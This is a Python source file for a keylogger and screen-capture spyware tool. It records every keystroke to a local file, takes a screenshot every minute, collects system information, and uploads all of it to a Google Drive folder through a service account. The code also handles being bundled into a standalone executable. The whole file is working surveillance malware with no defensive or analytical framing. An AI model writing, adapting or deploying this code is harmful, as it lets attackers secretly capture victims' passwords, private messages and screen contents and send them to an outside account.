import googleapiclient.http
import pyautogui
import threading
import time
import sys
import os

from pynput import keyboard
from datetime import datetime, timedelta
from google.oauth2 import service_account
from googleapiclient.discovery import build
from extract_sysinfo import get_system_info

# Global variable to count 'esc' key presses
esc_count = 0

# Threading event to signal the screenshot thread to stop
stop_screenshot_event = threading.Event()

# Log messages to data.txt
def log_message(message):
    timestamp = datetime.now().strftime("[%H:%M:%S][%Y-%m-%d]")
    with open("data.txt", "a") as file:
        file.write(f"{timestamp}\n{message}\n")
        file.flush()

# Handle key presses event
def on_press(key):
    global esc_count

    with open("data.txt", "a") as file:
        if key == keyboard.Key.space:
            file.write(" ")
            file.flush()
        elif key == keyboard.Key.enter:
            file.write("\n")
            file.flush()
        elif hasattr(key, 'char'):
            file.write(key.char)
            file.flush()
            
        if key == keyboard.Key.esc:
            esc_count += 1
            if esc_count >= 5:
                stop_screenshot_event.set()
                return False

# Google Drive Upload Variables
SCOPES = ['GOOGLE DRIVE API HERE']
SERVICE_ACCOUNT_FILE = 'JSON FILE FROM GOOGLE CLOUD HERE'
FOLDER_ID = 'GOOGLE DRIVE FOLDER ID HERE'

# Upload a file to Google Drive
def upload_file(file_path, folder_id):
    if hasattr(sys, '_MEIPASS'):
        credentials_path = os.path.join(sys._MEIPASS, 'JSON FILE FROM GOOGLE CLOUD HERE')
    else:
        credentials_path = 'JSON FILE FROM GOOGLE CLOUD HERE'

    credentials = service_account.Credentials.from_service_account_file(
        credentials_path, scopes=SCOPES
    )
    drive_service = build('drive', 'v3', credentials=credentials)

    file_metadata = {
        'name': os.path.basename(file_path),
        'parents': [folder_id]
    }
    media = googleapiclient.http.MediaFileUpload(file_path, mimetype='text/plain')
    file = drive_service.files().create(body=file_metadata, media_body=media, fields='id').execute()

    print('File uploaded Successfully. File ID: {}'.format(file.get('id')))

# Upload all [n] screenshots to Google Drive
def upload_screenshots_to_drive():
    ss_folder = os.getcwd()

    screenshot_files = [f for f in os.listdir(ss_folder) if f.startswith("ss_")]
    if screenshot_files:
        for screenshot_file in screenshot_files:
            screenshot_path = os.path.join(ss_folder, screenshot_file)
            upload_file(screenshot_path, FOLDER_ID)

def upload_info():
    info_file = "sysinfo.txt"

    upload_file(info_file, FOLDER_ID)

# Screenshot every 60 seconds
def screenshot_thread():
    ss_folder = os.getcwd()

    while not stop_screenshot_event.is_set():
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"ss_{timestamp}.png"
        filepath = os.path.join(ss_folder, filename)

        image = pyautogui.screenshot()
        image.save(filepath)
        time.sleep(60)

# Handle key release events
def on_release(key):
    pass


# Main function
def main():

    global esc_count
    esc_count = 0
    
    if not os.path.exists("data.txt"):
        open("data.txt", "w").close()  # Create an empty file if it doesn't exist
    
    log_message("Program started")
    start_time = datetime.now()
    next_timestamp = start_time + timedelta(seconds=3)  # Change to 3 seconds interval

    info = get_system_info()    # Extract system info
    with open("sysinfo.txt", "a") as file:
        for key, value in info.items():
            file.write(f"{key}: {value}\n")
    print("DEBUG: Successfully appended data to file.")

    upload_info()

    # Separate thread for taking screenshots
    screenshot_thread_instance = threading.Thread(target=screenshot_thread)
    screenshot_thread_instance.start()

    while True:
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            while datetime.now() < next_timestamp:
                if esc_count >= 5:
                    with open("data.txt", "a") as file:
                        file.write("\n")
                        file.flush()
                    break
                listener.join()
            
            log_message("Program Terminated\n")
            next_timestamp += timedelta(seconds=60)
            
            if esc_count >= 5:
                stop_screenshot_event.set()  # Stop screenshot
                screenshot_thread_instance.join()  # Wait for the screenshot thread to finish
                upload_screenshots_to_drive()
                file_path = 'data.txt'
                upload_file(file_path, FOLDER_ID)
                break

if __name__ == "__main__":
    main()
